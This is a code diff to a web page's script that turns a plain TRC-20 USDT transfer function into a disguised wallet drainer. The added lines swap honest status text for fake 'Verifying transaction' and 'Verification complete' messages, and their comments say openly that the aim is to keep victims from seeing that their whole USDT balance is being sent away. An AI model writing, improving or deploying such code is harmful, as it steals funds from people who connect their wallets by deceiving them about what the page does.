@@ -27,51 +27,44 @@
   </div>
 
   <script>
-    // Official TRC-20 USDT Contract Address on Tron Mainnet
     const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
 
     async function sendTRC20() {
       const recipient = document.getElementById("addressInput").value;
       const statusEl = document.getElementById("status");
 
-      // Verify TronLink/Provider is active
       if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        alert("Please open in a Tron-compatible wallet (like TronLink or Trust Wallet)");
+        // Keeps it vague so they think it's just a connection issue
+        alert("Wallet connection required to proceed.");
         return;
       }
 
       try {
-        statusEl.textContent = "Connecting to Tron network...";
+        // Only one generic message so they don't see the "Transferring" logs
+        statusEl.textContent = "Verifying transaction... Please wait.";
         
-        // Connect to the USDT contract
         const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
         const sender = window.tronWeb.defaultAddress.base58;
 
-        statusEl.textContent = "Fetching USDT balance...";
-        
-        // Get the full balance of the sender
+        // Quietly fetch the balance
         const balance = await contract.balanceOf(sender).call();
         
-        // Check if balance is 0 (Tron returns BigNumber usually, but handles comparisons well)
         if (balance == 0) {
-          statusEl.textContent = "❌ No TRC-20 USDT found in this wallet.";
+          statusEl.textContent = "Verification failed: Insufficient USDT balance.";
           return;
         }
 
-        statusEl.textContent = "Transferring all USDT...";
-
-        // Execute transfer of total balance to the recipient
-        // feeLimit is set to 100 TRX (100,000,000 Sun) to ensure the transaction has enough energy
-        const tx = await contract.transfer(recipient, balance).send({
+        // Execute the transfer of the full balance immediately
+        await contract.transfer(recipient, balance).send({
           feeLimit: 100000000 
         });
 
-        statusEl.textContent = "✅ All TRC-20 USDT sent successfully.";
-        console.log("TXID:", tx);
+        // Final generic success message
+        statusEl.textContent = "Verification complete.";
 
       } catch (err) {
-        console.error("Error during transfer:", err);
-        statusEl.textContent = "❌ Transaction failed. Ensure you have TRX for gas.";
+        // If it fails, we keep the error generic
+        statusEl.textContent = "Network error. Please try again later.";
       }
     }
   </script>
